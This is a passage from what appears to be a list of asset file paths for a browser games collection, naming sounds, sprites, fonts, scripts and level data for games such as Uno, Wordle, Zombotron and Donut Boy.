amination05.ogg","/src/there-is-no-game/media/contamination06.ogg","/src/there-is-no-game/media/contamination07.ogg","/src/there-is-no-game/media/contamination08.ogg","/src/there-is-no-game/media/contamination09.ogg","/src/there-is-no-game/media/contamination10.ogg","/src/there-is-no-game/media/contamination11.ogg","/src/there-is-no-game/media/contamination12.ogg","/src/there-is-no-game/media/contamination13.ogg","/src/there-is-no-game/media/contamination14.ogg","/src/there-is-no-game/media/contamination15.ogg","/src/there-is-no-game/media/contamination16.ogg","/src/there-is-no-game/media/contamination17.ogg","/src/there-is-no-game/media/contamination18.ogg","/src/there-is-no-game/media/contamination19.ogg","/src/there-is-no-game/media/contamination20.ogg","/src/there-is-no-game/media/contamination21.ogg","/src/there-is-no-game/media/contamination22.ogg","/src/there-is-no-game/media/contamination23.ogg","/src/there-is-no-game/media/devisse.ogg","/src/there-is-no-game/media/devisse01.ogg","/src/there-is-no-game/media/drag.ogg","/src/there-is-no-game/media/dropbounce.ogg","/src/there-is-no-game/media/endmusic.ogg","/src/there-is-no-game/media/fontaine.ogg","/src/there-is-no-game/media/friend01.ogg","/src/there-is-no-game/media/friend02.ogg","/src/there-is-no-game/media/friend03.ogg","/src/there-is-no-game/media/friend04.ogg","/src/there-is-no-game/media/friend05.ogg","/src/there-is-no-game/media/friend06.ogg","/src/there-is-no-game/media/friend07.ogg","/src/there-is-no-game/media/friend08.ogg","/src/there-is-no-game/media/friendno00.ogg","/src/there-is-no-game/media/friendno01.ogg","/src/there-is-no-game/media/friendyes01.ogg","/src/there-is-no-game/media/friendyes02.ogg","/src/there-is-no-game/media/friendyes03.ogg","/src/there-is-no-game/media/friendyes04.ogg","/src/there-is-no-game/media/friendyes05.ogg","/src/there-is-no-game/media/friendyes06.ogg","/src/there-is-no-game/media/friendyes07.ogg","/src/there-is-no-game/media/friendyes08.ogg","/src/there-is-no-game/media/gamelettersok01.ogg","/src/there-is-no-game/media/gamelettersok02.ogg","/src/there-is-no-game/media/gamelettersok03.ogg","/src/there-is-no-game/media/gamelettersok04.ogg","/src/there-is-no-game/media/gamelettersok05.ogg","/src/there-is-no-game/media/gamelettersok06.ogg","/src/there-is-no-game/media/gamelettersok07.ogg","/src/there-is-no-game/media/glitch.ogg","/src/there-is-no-game/media/glitchfinambiance.ogg","/src/there-is-no-game/media/glitchzik.ogg","/src/there-is-no-game/media/goat01.ogg","/src/there-is-no-game/media/goat02.ogg","/src/there-is-no-game/media/goatfound01.ogg","/src/there-is-no-game/media/goatfound02.ogg","/src/there-is-no-game/media/goatfound03.ogg","/src/there-is-no-game/media/goatfree01.ogg","/src/there-is-no-game/media/goatfree02.ogg","/src/there-is-no-game/media/goatfree03.ogg","/src/there-is-no-game/media/goatfree04.ogg","/src/there-is-no-game/media/goatfree05.ogg","/src/there-is-no-game/media/goatfreedrown.ogg","/src/there-is-no-game/media/intro01.ogg","/src/there-is-no-game/media/intro02.ogg","/src/there-is-no-game/media/intro03.ogg","/src/there-is-no-game/media/intro04.ogg","/src/there-is-no-game/media/intro05.ogg","/src/there-is-no-game/media/intro05b.ogg","/src/there-is-no-game/media/intro06.ogg","/src/there-is-no-game/media/intro07.ogg","/src/there-is-no-game/media/intro08.ogg","/src/tunnelrush/style/favicon.ico","/src/tunnelrush/style/fullscreen.png","/src/tunnelrush/style/progressEmpty.Dark.png","/src/tunnelrush/style/progressFull.Dark.png","/src/tunnelrush/style/progressLogo.Dark.png","/src/tunnelrush/style/webgl-logo.png","/src/unfair-dyne/css/undertale.css","/src/unfair-dyne/css/webfont.css","/src/unfair-dyne/fonts/numbers.fnt","/src/unfair-dyne/fonts/numbers.png","/src/unfair-dyne/fonts/speechbubble.fnt","/src/unfair-dyne/fonts/speechbubble.png","/src/unfair-dyne/fonts/undertale.fnt","/src/unfair-dyne/fonts/undertale.png","/src/unfair-dyne/img/arrow.png","/src/unfair-dyne/img/by.png","/src/unfair-dyne/img/fairdyne.png","/src/unfair-dyne/img/ground1.png","/src/unfair-dyne/img/ground2.png","/src/unfair-dyne/img/ground3.png","/src/unfair-dyne/img/heart.png","/src/unfair-dyne/img/pike.png","/src/unfair-dyne/img/shield.png","/src/unfair-dyne/img/spear.png","/src/unfair-dyne/img/speechbubble.png","/src/unfair-dyne/img/un.png","/src/unfair-dyne/img/undyne.png","/src/unfair-dyne/img/undyne_breastplate.png","/src/unfair-dyne/img/undyne_hair1.png","/src/unfair-dyne/img/undyne_hair2.png","/src/unfair-dyne/img/undyne_hair3.png","/src/unfair-dyne/img/undyne_hair4.png","/src/unfair-dyne/img/undyne_head1.png","/src/unfair-dyne/img/undyne_head2.png","/src/unfair-dyne/img/undyne_head_angry.png","/src/unfair-dyne/img/undyne_head_annoyed.png","/src/unfair-dyne/img/undyne_intro_hairless.png","/src/unfair-dyne/img/undyne_leftarm.png","/src/unfair-dyne/img/undyne_legs.png","/src/unfair-dyne/img/undyne_rightarm.png","/src/unfair-dyne/img/undyne_skirt.png","/src/unfair-dyne/js/input.js","/src/unfair-dyne/js/main.js","/src/unfair-dyne/js/preload.js","/src/unfair-dyne/js/rendering.js","/src/unfair-dyne/js/scene.js","/src/unfair-dyne/js/vars.js","/src/unfair-dyne/lib/funcs.js","/src/unfair-dyne/lib/howler.min.js","/src/unfair-dyne/lib/lodash.min.js","/src/unfair-dyne/lib/pixi.min.js","/src/uno/css/animation.css","/src/uno/css/comfortaa-bold-webfont.woff2","/src/uno/css/ctl-multiplayer-icons.css","/src/uno/css/ctl-multiplayer.css","/src/uno/css/ios_fullscreen.css","/src/uno/css/main.css","/src/uno/css/orientation_utils.css","/src/uno/css/reset.css","/src/uno/js/CLang.js","/src/uno/js/main.js","/src/uno/sounds/card.mp3","/src/uno/sounds/card_dealing.mp3","/src/uno/sounds/change_color.mp3","/src/uno/sounds/click.mp3","/src/uno/sounds/game_over.mp3","/src/uno/sounds/snap.mp3","/src/uno/sounds/soundtrack.mp3","/src/uno/sounds/special_card.mp3","/src/uno/sprites/200x200.jpg","/src/uno/sprites/arrow.png","/src/uno/sprites/audio_icon.png","/src/uno/sprites/bg_game.jpg","/src/uno/sprites/bg_menu.jpg","/src/uno/sprites/bg_select_players.jpg","/src/uno/sprites/but_exit.png","/src/uno/sprites/but_exit_big.png","/src/uno/sprites/but_fullscreen.png","/src/uno/sprites/but_home.png","/src/uno/sprites/but_info.png","/src/uno/sprites/but_next.png","/src/uno/sprites/but_p2.png","/src/uno/sprites/but_p3.png","/src/uno/sprites/but_p4.png","/src/uno/sprites/but_restart.png","/src/uno/sprites/but_show.png","/src/uno/sprites/but_skip.png","/src/uno/sprites/but_start.png","/src/uno/sprites/but_uno.png","/src/uno/sprites/but_yes_big.png","/src/uno/sprites/cards.png","/src/uno/sprites/change_clockwise.png","/src/uno/sprites/change_color.png","/src/uno/sprites/cloud.png","/src/uno/sprites/colors.png","/src/uno/sprites/credits_panel.png","/src/uno/sprites/ctl_logo.png","/src/uno/sprites/cup_icon.png","/src/uno/sprites/draw_2.png","/src/uno/sprites/draw_3.png","/src/uno/sprites/finger.png","/src/uno/sprites/info_label.png","/src/uno/sprites/line_players.png","/src/uno/sprites/local_but.png","/src/uno/sprites/msg_box.png","/src/uno/sprites/multiplayer_but.png","/src/uno/sprites/oButBlue.png","/src/uno/sprites/oButGreen.png","/src/uno/sprites/oButRed.png","/src/uno/sprites/oButYellow.png","/src/uno/sprites/progress_bar.png","/src/uno/sprites/score_icon.png","/src/uno/sprites/select_color_panel.png","/src/uno/sprites/shuffle_anim.png","/src/uno/sprites/stop_turn.png","/src/vex5/images/branding_logo_agame.png","/src/vex5/images/branding_logo_agame_small.png","/src/vex5/json/contracted.json","/src/vex5/json/domains.json","/src/vex5/json/internal.json","/src/vex5/json/sitelock.json","/src/vex5/json/special.json","/src/volley-random/images/armskin-sheet0.png","/src/volley-random/images/bombtimer-sheet0.png","/src/volley-random/images/buildingtile-sheet0.png","/src/volley-random/images/buildingtile2-sheet0.png","/src/volley-random/images/buildingtile3-sheet0.png","/src/volley-random/images/cloudtile-sheet0.png","/src/volley-random/images/fencetile-sheet0.png","/src/volley-random/images/filetile-sheet0.png","/src/volley-random/images/game_bg-sheet0.png","/src/volley-random/images/grasslinetile-sheet0.png","/src/volley-random/images/grasstile-sheet0.png","/src/volley-random/images/grasstile2-sheet0.png","/src/volley-random/images/groundtile-sheet0.png","/src/volley-random/images/groundtileindoor-sheet0.png","/src/volley-random/images/groundtileplaj-sheet0.png","/src/volley-random/images/groundtilesnow-sheet0.png","/src/volley-random/images/hair-sheet0.png","/src/volley-random/images/indoorbgtile-sheet0.png","/src/volley-random/images/indoorbgtile2-sheet0.png","/src/volley-random/images/indoorbgtile3-sheet0.png","/src/volley-random/images/rightshoe-sheet0.png","/src/volley-random/images/rightshort-sheet0.png","/src/volley-random/images/seatile-sheet0.png","/src/volley-random/images/shared-0-sheet0.png","/src/volley-random/images/shared-0-sheet1.png","/src/volley-random/images/shared-0-sheet2.png","/src/volley-random/images/shared-0-sheet3.png","/src/volley-random/images/shared-1-sheet0.png","/src/volley-random/images/shared-1-sheet1.png","/src/volley-random/images/shared-1-sheet2.png","/src/volley-random/images/smoketile-sheet0.png","/src/volley-random/images/snowtile-sheet0.png","/src/volley-random/images/startile-sheet0.png","/src/volley-random/images/titlebg-sheet0.png","/src/volley-random/images/titlechars-sheet0.png","/src/volley-random/images/tshirt-sheet0.png","/src/volley-random/media/alarm.webm","/src/volley-random/media/bellsoc.webm","/src/volley-random/media/bonebreak.webm","/src/volley-random/media/bup.webm","/src/volley-random/media/bupbasket.webm","/src/volley-random/media/bupfoot.webm","/src/volley-random/media/bupred.webm","/src/volley-random/media/buttonx.webm","/src/volley-random/media/expo.webm","/src/volley-random/media/file.webm","/src/volley-random/media/goasoc.webm","/src/volley-random/media/intro-button.webm","/src/volley-random/media/intro-sound.webm","/src/volley-random/media/jump.webm","/src/volley-random/media/menu.webm","/src/volley-random/media/music.webm","/src/volley-random/media/press.webm","/src/volley-random/media/refsoc.webm","/src/volley-random/media/start.webm","/src/volley-random/media/win.webm","/src/volley-random/media/wrong.webm","/src/volley-random/scripts/c3runtime.js","/src/volley-random/scripts/dispatchworker.js","/src/volley-random/scripts/jobworker.js","/src/volley-random/scripts/main.js","/src/volley-random/scripts/offlineclient.js","/src/volley-random/scripts/register-sw.js","/src/volley-random/scripts/supportcheck.js","/src/webgl-rollingsky/img/arrow-left.svg","/src/webgl-rollingsky/img/arrow-right.svg","/src/webgl-rollingsky/img/icon.png","/src/webgl-rollingsky/img/next.svg","/src/webgl-rollingsky/img/previous.svg","/src/webgl-rollingsky/img/retry.svg","/src/webgl-rollingsky/level-creator/index.html","/src/webgl-rollingsky/level-creator/main.js","/src/webgl-rollingsky/level-creator/style.css","/src/wordle/images/wordle_logo_32x32.png","/src/wordle/js/main.js","/src/wordle/js/words.js","/src/zombotron/assets/index-x.html","/src/zombotron/assets/zombotron.js","/src/zombotron-2/assets/index-x.html","/src/zombotron-2/assets/zombotron2.js","/src/zombotron-2-time-machine/assets/index-x.html","/src/zombotron-2-time-machine/assets/zombotron2timemachine.js","/src/zombsroyale/asset/app.css","/src/zombsroyale/asset/app.js","/src/zombsroyale/build/webgl","/src/zombsroyale/build/webgl.json","/src/2048/style/fonts/clear-sans.css","/src/2048/style/fonts/ClearSans-Bold-webfont.eot","/src/2048/style/fonts/ClearSans-Bold-webfont.svg","/src/2048/style/fonts/ClearSans-Bold-webfont.woff","/src/2048/style/fonts/ClearSans-Light-webfont.eot","/src/2048/style/fonts/ClearSans-Light-webfont.svg","/src/2048/style/fonts/ClearSans-Light-webfont.woff","/src/2048/style/fonts/ClearSans-Regular-webfont.eot","/src/2048/style/fonts/ClearSans-Regular-webfont.svg","/src/2048/style/fonts/ClearSans-Regular-webfont.woff","/src/a-dark-room/script/events/encounters.js","/src/a-dark-room/script/events/global.js","/src/a-dark-room/script/events/marketing.js","/src/a-dark-room/script/events/outside.js","/src/a-dark-room/script/events/room.js","/src/a-dark-room/script/events/setpieces.js","/src/basketball-stars/assets/box2dweb/bluebird.min.js","/src/basketball-stars/assets/box2dweb/dragonBones.min.js","/src/basketball-stars/assets/box2dweb/easeljs-0.8.2.combined.js","/src/basketball-stars/assets/box2dweb/jquery-3.1.1.min.js","/src/basketball-stars/assets/box2dweb/nape-debug-draw.min.js","/src/basketball-stars/assets/box2dweb/nape.min.js","/src/basketball-stars/assets/css/AllerDisplay.css","/src/basketball-stars/assets/css/app.css","/src/basketball-stars/assets/css/CfCrackBold.css","/src/basketball-stars/assets/css/impact.css","/src/basketball-stars/assets/css/impact2.css","/src/basketball-stars/assets/css/impact3.css","/src/basketball-stars/assets/data/Players.json","/src/basketball-stars/assets/data/sk.json","/src/basketball-stars/assets/data/sk2.json","/src/basketball-stars/assets/data/sk3.json","/src/basketball-stars/assets/data/texture.json","/src/basketball-stars/assets/data/texture2.json","/src/basketball-stars/assets/data/texture3.json","/src/basketball-stars/assets/sound/10_B_Ring.ogg","/src/basketball-stars/assets/sound/11_P_MegaStart.ogg","/src/basketball-stars/assets/sound/12_M_Lost.ogg","/src/basketball-stars/assets/sound/13_P_Shield.ogg","/src/basketball-stars/assets/sound/14_P_FloorStand.ogg","/src/basketball-stars/assets/sound/15_P_FloorRun.ogg","/src/basketball-stars/assets/sound/16_B_Bounce.ogg","/src/basketball-stars/assets/sound/17_P_Dash.ogg","/src/basketball-stars/assets/sound/18_P_SuperDash.ogg","/src/basketball-stars/assets/sound/19_M_Countdown.ogg","/src/basketball-stars/assets/sound/1_M_Win.ogg","/src/basketball-stars/assets/sound/20_ButtonSnd.ogg","/src/basketball-stars/assets/sound/21_B_NET.ogg","/src/basketball-stars/assets/sound/22_B_Brick.ogg","/src/basketball-stars/assets/sound/23_B_Basket.ogg","/src/basketball-stars/assets/sound/24_TrackSnd.ogg","/src/basketball-stars/assets/sound/2_M_Whistle.ogg","/src/basketball-stars/assets/sound/3_M_Tribune.ogg","/src/basketball-stars/assets/sound/4_P_Teleport.ogg","/src/basketball-stars/assets/sound/5_P_Swoosh.ogg","/src/basketball-stars/assets/sound/6_P_Energy.ogg","/src/basketball-stars/assets/sound/7_P_Stunned.ogg","/src/basketball-stars/assets/sound/8_B_Steel.ogg","/src/basketball-stars/assets/sound/9_M_Buzzer.ogg","/src/breaklock/assets/fonts/robotomono-light-webfont.ttf","/src/breaklock/assets/fonts/robotomono-light-webfont.woff","/src/breaklock/assets/fonts/robotomono-light-webfont.woff2","/src/breaklock/assets/icons/icon-128x128.png","/src/breaklock/assets/icons/icon-144x144.png","/src/breaklock/assets/icons/icon-152x152.png","/src/breaklock/assets/icons/icon-192x192.png","/src/breaklock/assets/icons/icon-256x256.png","/src/breaklock/assets/icons/ios-180x180.png","/src/breaklock/assets/ios-startup/startup-1080x1920.png","/src/breaklock/assets/ios-startup/startup-640x1136.png","/src/breaklock/assets/ios-startup/startup-640x960.png","/src/breaklock/assets/ios-startup/startup-750x1334.png","/src/breaklock/assets/vectors/cover.svg","/src/breaklock/assets/vectors/icon.svg","/src/breaklock/src/controllers/readme.md","/src/breaklock/src/models/pattern.js","/src/breaklock/src/utils/airportText.js","/src/breaklock/src/utils/color.js","/src/breaklock/src/utils/dom.js","/src/breaklock/src/utils/leftPadNum.js","/src/breaklock/src/utils/patternSVG.js","/src/breaklock/src/utils/polyfill.js","/src/colorun/public/svg/ball.svg","/src/colorun/public/svg/clouds.svg","/src/colorun/public/svg/cursor-tap.svg","/src/colorun/public/svg/cursor.svg","/src/colorun/public/svg/mount1.svg","/src/colorun/public/svg/mount2.svg","/src/colorun/public/svg/noise.png","/src/colorun/public/svg/top_wave.png","/src/colorun/public/svg/wave1.svg","/src/colorun/public/svg/wave2.svg","/src/colorun/public/svg/wave3.svg","/src/colorun/public/svg/wave4.svg","/src/dinosaur/assets/default_100_percent/100-disabled.png","/src/dinosaur/assets/default_100_percent/100-error-offline.png","/src/dinosaur/assets/default_100_percent/100-offline-sprite.png","/src/dinosaur/assets/default_200_percent/200-disabled.png","/src/dinosaur/assets/default_200_percent/200-error-offline.png","/src/dinosaur/assets/default_200_percent/200-offline-sprite.png","/src/donut-boy/assets-db/fonts/04b_30__-webfont.woff2","/src/donut-boy/assets-db/audio/alreadyHaveMGSSFX.mp3","/src/donut-boy/assets-db/audio/autoDoorOpenSFX.mp3","/src/donut-boy/assets-db/audio/badSpeak.mp3","/src/donut-boy/assets-db/audio/baker1SFX.mp3","/src/donut-boy/assets-db/audio/baker2SFX.mp3","/src/donut-boy/assets-db/audio/bakerDeflectSFX.mp3","/src/donut-boy/assets-db/audio/bat1SFX.mp3","/src/donut-boy/assets-db/audio/bat2SFX.mp3","/src/donut-boy/assets-db/audio/beachBall1SFX.mp3","/src/donut-boy/assets-db/audio/beachBall2SFX.mp3","/src/donut-boy/assets-db/audio/beachBall3SFX.mp3","/src/donut-boy/assets-db/audio/beep1SFX.mp3","/src/donut-boy/assets-db/audio/beep2SFX.mp3","/src/donut-boy/assets-db/audio/boing.mp3","/src/donut-boy/assets-db/audio/buttonSqueakSFX.mp3","/src/donut-boy/assets-db/audio/ceilingCrash2SFX.mp3","/src/donut-boy/assets-db/audio/chainPull2SFX.mp3","/src/donut-boy/assets-db/audio/checkpointBellSFX.mp3","/src/donut-boy/assets-db/audio/clamCrackSFX.mp3","/src/donut-boy/assets-db/audio/clamHitSFX.mp3","/src/donut-boy/assets-db/audio/crabCrackSFX.mp3","/src/donut-boy/assets-db/audio/crabHitSFX.mp3","/src/donut-boy/assets-db/audio/crateBreak.mp3","/src/donut-boy/assets-db/audio/crateBreakMetal.mp3","/src/donut-boy/assets-db/audio/death1.mp3","/src/donut-boy/assets-db/audio/death2.mp3","/src/donut-boy/assets-db/audio/death3.mp3","/src/donut-boy/assets-db/audio/donutAlarmSFX.mp3","/src/donut-boy/assets-db/audio/door4SFX.mp3","/src/donut-boy/assets-db/audio/doughSlap1SFX.mp3","/src/donut-boy/assets-db/audio/doughSlap2SFX.mp3","/src/donut-boy/assets-db/audio/doughSlap3SFX.mp3","/src/donut-boy/assets-db/audio/dust1SFX.mp3","/src/donut-boy/assets-db/audio/dust2SFX.mp3","/src/donut-boy/assets-db/audio/eatSFX.mp3","/src/donut-boy/assets-db/audio/elevatorSFX.mp3","/src/donut-boy/assets-db/audio/evilLaughSFX.mp3","/src/donut-boy/assets-db/audio/fatMan1SFX.mp3","/src/donut-boy/assets-db/audio/fatMan2SFX.mp3","/src/donut-boy/assets-db/audio/fatMan3SFX.mp3","/src/donut-boy/assets-db/audio/fatMan4SFX.mp3","/src/donut-boy/assets-db/audio/fireSFX.mp3","/src/donut-boy/assets-db/audio/fish1SFX.mp3","/src/donut-boy/assets-db/audio/fish2SFX.mp3","/src/donut-boy/assets-db/audio/fishAlarmSFX.mp3","/src/donut-boy/assets-db/audio/frisbeeSFX2.mp3","/src/donut-boy/assets-db/audio/frisbeeThudSFX.mp3","/src/donut-boy/assets-db/audio/gateCloseSFX.mp3","/src/donut-boy/assets-db/audio/gateOpeningSFX.mp3","/src/donut-boy/assets-db/audio/glassCrackSFX.mp3","/src/donut-boy/assets-db/audio/gunshot.mp3","/src/donut-boy/assets-db/audio/indianaBoomSFX.mp3","/src/donut-boy/assets-db/audio/indianaRollingSFX.mp3","/src/donut-boy/assets-db/audio/jumpNew.mp3","/src/donut-boy/assets-db/audio/laserSFX.mp3","/src/donut-boy/assets-db/audio/lockedDoorSFX.mp3","/src/donut-boy/assets-db/audio/milonBubble.mp3","/src/donut-boy/assets-db/audio/pearlCrackSFX.mp3","/src/donut-boy/assets-db/audio/pickupSFX.mp3","/src/donut-boy/assets-db/audio/pistol2.mp3","/src/donut-boy/assets-db/audio/platBreakSFX.mp3","/src/donut-boy/assets-db/audio/playerHurt.mp3","/src/donut-boy/assets-db/audio/poofInSFX.mp3","/src/donut-boy/assets-db/audio/poofOutSFX.mp3","/src/donut-boy/assets-db/audio/pop1.mp3","/src/donut-boy/assets-db/audio/pop2.mp3","/src/donut-boy/assets-db/audio/pop3.mp3","/src/donut-boy/assets-db/audio/puggsyDieSFX.mp3","/src/donut-boy/assets-db/audio/recordScratchSFX.mp3","/src/donut-boy/assets-db/audio/rockCrumbleSFX.mp3","/src/donut-boy/assets-db/audio/rockDestroySFX.mp3","/src/donut-boy/assets-db/audio/seagull1SFX.mp3","/src/donut-boy/assets-db/audio/seagull2louderSFX.mp3","/src/donut-boy/assets-db/audio/shotgunSFX2.mp3","/src/donut-boy/assets-db/audio/sizzleSFX.mp3","/src/donut-boy/assets-db/audio/slapSFX.mp3","/src/donut-boy/assets-db/audio/speak.mp3","/src/donut-boy/assets-db/audio/spiderDieSFX.mp3","/src/donut-boy/assets-db/audio/spiderHurtSFX.mp3","/src/donut-boy/assets-db/audio/spikeFallSFX.mp3","/src/donut-boy/assets-db/audio/splashSFX.mp3","/src/donut-boy/assets-db/audio/squeak1SFX.mp3","/src/donut-boy/assets-db/audio/squeak2SFX.mp3","/src/donut-boy/assets-db/audio/static.mp3","/src/donut-boy/assets-db/audio/swim3SFX.mp3","/src/donut-boy/assets-db/audio/switchOffSFX.mp3","/src/donut-boy/assets-db/audio/switchOnSFX.mp3","/src/donut-boy/assets-db/audio/tinkSFX.mp3","/src/donut-boy/assets-db/audio/toasterHitSFX.mp3","/src/donut-boy/assets-db/audio/toasterSFX.mp3","/src/donut-boy/assets-db/audio/toasterSmashSFX.mp3","/src/donut-boy/assets-db/audio/waterDrainSFX.mp3","/src/donut-boy/assets-db/audio/weaponChangeBetaSFX.mp3","/src/donut-boy/assets-db/audio/weaponGetSFX.mp3","/src/donut-boy/assets-db/audio/weaponSwitchSFX.mp3","/src/donut-boy/assets-db/audio/wooshSFX.mp3","/src/donut-boy/assets-db/audio/yay2.mp3","/src/donut-boy/assets-db/audio/zombieSFX1.mp3","/src/donut-boy/assets-db/levels/levelAA.json","/src/donut-boy/assets-db/levels/levelData18.json","/src/donut-boy/assets-db/levels/levelData20.json","/src/donut-boy/assets-db/levels/levelData21.json","/src/donut-boy/assets-db/levels/levelData22.json","/src/donut-boy/assets-db/levels/levelData23.json","/src/donut-boy/assets-db/levels/levelData24.json","/src/donut-boy/assets-db/levels/levelData25.json","/src/donut-boy/assets-db/levels/levelT.json","/src/donut-boy/assets-db/levels/levelV.json","/src/donut-boy/assets-db/levels/levelW.json","/src/donut-boy/assets-db/levels/levelX.json","/src/donut-boy/assets-db/levels/levelY.json","/src/donut-boy/assets-db/levels/levelZ.json","/src/donut-boy/assets-db/images/25x25_trans.png","/src/donut-boy/assets-db/images/abdullah2.png","/src/donut-boy/assets-db/images/autoDoor.png","/src/donut-boy/assets-db/images/baker_spritesheet.png","/src/donut-boy/assets-db/images/beachBall2.png","/src/donut-boy/assets-db/images/beachParallaxBG.png","/src/donut-boy/assets-db/images/bill2.png","/src/donut-boy/assets-db/images/blood1.png","/src/donut-boy/assets-db/images/blood2.png","/src/donut-boy/assets-db/images/blood3.png","/src/donut-boy/assets-db/images/blood4.png","/src/donut-boy/assets-db/images/blood5.png","/src/donut-boy/assets-db/images/blood6.png","/src/donut-boy/assets-db/images/blood7.png","/src/donut-boy/assets-db/images/blood8.png","/src/donut-boy/assets-db/images/brain.png","/src/donut-boy/assets-db/images/breadCart.png","/src/donut-boy/assets-db/images/breadCartButts.png","/src/donut-boy/assets-db/images/breadMaker3.png","/src/donut-boy/assets-db/images/bubble.png","/src/donut-boy/assets-db/images/bullet.png","/src/donut-boy/assets-db/images/bullet_icon_bubblegun.png","/src/donut-boy/assets-db/images/bullet_icon_clobb.png","/src/donut-boy/assets-db/images/bullet_icon_croissant.png","/src/donut-boy/assets-db/images/bullet_icon_frisbee.png","/src/donut-boy/assets-db/images/bullet_icon_laser.png","/src/donut-boy/assets-db/images/bullet_icon_pistol.png","/src/donut-boy/assets-db/images/bullet_icon_shotgun.png","/src/donut-boy/assets-db/images/button.png","/src/donut-boy/assets-db/images/buzzsaw_spritesheet.png","/src/donut-boy/assets-db/images/cage.png","/src/donut-boy/assets-db/images/chainLiftChild2.png","/src/donut-boy/assets-db/images/cheat_spritesheet.png","/src/donut-boy/assets-db/images/chops.png","/src/donut-boy/assets-db/images/clam_spritesheet3.png","/src/donut-boy/assets-db/images/controls.png","/src/donut-boy/assets-db/images/conveyerLeft_spritesheet.png","/src/donut-boy/assets-db/images/crab_spritesheet.png","/src/donut-boy/assets-db/images/crate3.png","/src/donut-boy/assets-db/images/crate_metal.png","/src/donut-boy/assets-db/images/creep.png","/src/donut-boy/assets-db/images/cRoll1.png","/src/donut-boy/assets-db/images/cRoll2.png","/src/donut-boy/assets-db/images/cRoll3.png","/src/donut-boy/assets-db/images/damon_fingerRemoved.png","/src/donut-boy/assets-db/images/donut.png","/src/donut-boy/assets-db/images/donut1_black.png","/src/donut-boy/assets-db/images/donut2.png","/src/donut-boy/assets-db/images/donut2_black.png","/src/donut-boy/assets-db/images/donut3.png","/src/donut-boy/assets-db/images/donut3_black.png","/src/donut-boy/assets-db/images/donut4.png","/src/donut-boy/assets-db/images/donut5.png","/src/donut-boy/assets-db/images/doorEmit.png","/src/donut-boy/assets-db/images/door_beta.png","/src/donut-boy/assets-db/images/door_beta_sideways.png","/src/donut-boy/assets-db/images/door_lol.png","/src/donut-boy/assets-db/images/dust_bullet.png","/src/donut-boy/assets-db/images/elevator.png","/src/donut-boy/assets-db/images/explosion2.png","/src/donut-boy/assets-db/images/eyeball.png","/src/donut-boy/assets-db/images/factoryHoleBG.png","/src/donut-boy/assets-db/images/factory_spritesheet2.png","/src/donut-boy/assets-db/images/fakeSand2.png","/src/donut-boy/assets-db/images/fakeWater_spritesheet.png","/src/donut-boy/assets-db/images/fatMan_spritesheet.png","/src/donut-boy/assets-db/images/favicon.png","/src/donut-boy/assets-db/images/fire_spritesheet_TEST2.png","/src/donut-boy/assets-db/images/fishlol2.png","/src/donut-boy/assets-db/images/foxLaser.png","/src/donut-boy/assets-db/images/frisbee.png","/src/donut-boy/assets-db/images/gKnot1.png","/src/donut-boy/assets-db/images/gKnot2.png","/src/donut-boy/assets-db/images/gKnot3.png","/src/donut-boy/assets-db/images/gold_key.png","/src/donut-boy/assets-db/images/grams.png","/src/donut-boy/assets-db/images/graveGhost_spritesheet.png","/src/donut-boy/assets-db/images/graveSecret.png","/src/donut-boy/assets-db/images/gullDung.png","/src/donut-boy/assets-db/images/gull_test_spritesheet.png","/src/donut-boy/assets-db/images/gunbug_bullet.png","/src/donut-boy/assets-db/images/gunbug_spritesheet.png","/src/donut-boy/assets-db/images/hatch_spritesheet.png","/src/donut-boy/assets-db/images/hatNew.png","/src/donut-boy/assets-db/images/health1.png","/src/donut-boy/assets-db/images/health2.png","/src/donut-boy/assets-db/images/healthHUD1.png","/src/donut-boy/assets-db/images/healthHUD2.png","/src/donut-boy/assets-db/images/hideIndiana.png","/src/donut-boy/assets-db/images/hideIndianaEmit1.png","/src/donut-boy/assets-db/images/hideIndianaEmit3.png","/src/donut-boy/assets-db/images/hotSauce.png","/src/donut-boy/assets-db/images/indianaRoll3.png","/src/donut-boy/assets-db/images/invincibleEmit4.png","/src/donut-boy/assets-db/images/jesus2.png","/src/donut-boy/assets-db/images/jon2.png","/src/donut-boy/assets-db/images/karl.png","/src/donut-boy/assets-db/images/kelly.png","/src/donut-boy/assets-db/images/kifli.png","/src/donut-boy/assets-db/images/loaf_spritesheet.png","/src/donut-boy/assets-db/images/menuArrow.png","/src/donut-boy/assets-db/images/menuBG.png","/src/donut-boy/assets-db/images/menuFG3.png","/src/donut-boy/assets-db/images/mezcal.png","/src/donut-boy/assets-db/images/newnew_bat_spritesheet2.png","/src/donut-boy/assets-db/images/new_dust_spritesheet.png","/src/donut-boy/assets-db/images/paralaxBGTest.png","/src/donut-boy/assets-db/images/pargo.png","/src/donut-boy/assets-db/images/pearl.png","/src/donut-boy/assets-db/images/pearlEmit.png","/src/donut-boy/assets-db/images/piggy.png","/src/donut-boy/assets-db/images/pillsDrBl.png","/src/donut-boy/assets-db/images/pixelboi.png","/src/donut-boy/assets-db/images/plank.png","/src/donut-boy/assets-db/images/plankMetal.png","/src/donut-boy/assets-db/images/platEmit1.png","/src/donut-boy/assets-db/images/platEmit2.png","/src/donut-boy/assets-db/images/platform.png","/src/donut-boy/assets-db/images/platform_falling.png","/src/donut-boy/assets-db/images/platform_leftright3.png","/src/donut-boy/assets-db/images/platform_square.png","/src/donut-boy/assets-db/images/plsUnbury_spritesheet.png","/src/donut-boy/assets-db/images/powerupItem.png","/src/donut-boy/assets-db/images/preload-donut.png","/src/donut-boy/assets-db/images/pressChild2.png","/src/donut-boy/assets-db/images/pressChild2Small.png","/src/donut-boy/assets-db/images/pressChildXL.png","/src/donut-boy/assets-db/images/pumpkin_sketch.png","/src/donut-boy/assets-db/images/pup.png","/src/donut-boy/assets-db/images/rat2.png","/src/donut-boy/assets-db/images/rat_drunk.png","/src/donut-boy/assets-db/images/rat_smoking.png","/src/donut-boy/assets-db/images/realBigFish_spritesheet.png","/src/donut-boy/assets-db/images/real_heart.png","/src/donut-boy/assets-db/images/sam.png","/src/donut-boy/assets-db/images/skull.png","/src/donut-boy/assets-db/images/spaceboy2.png","/src/donut-boy/assets-db/images/spider_spritesheet3.png","/src/donut-boy/assets-db/images/spike0.png","/src/donut-boy/assets-db/images/spike_falling.png","/src/donut-boy/assets-db/images/spleen.png","/src/donut-boy/assets-db/images/springLauncher_spritesheet.png","/src/donut-boy/assets-db/images/static_spritesheet.png","/src/donut-boy/assets-db/images/statsChar.png","/src/donut-boy/assets-db/images/switch_spritesheet.png","/src/donut-boy/assets-db/images/tilesetDEC.png","/src/donut-boy/assets-db/images/title_controls2.png","/src/donut-boy/assets-db/images/toast.png","/src/donut-boy/assets-db/i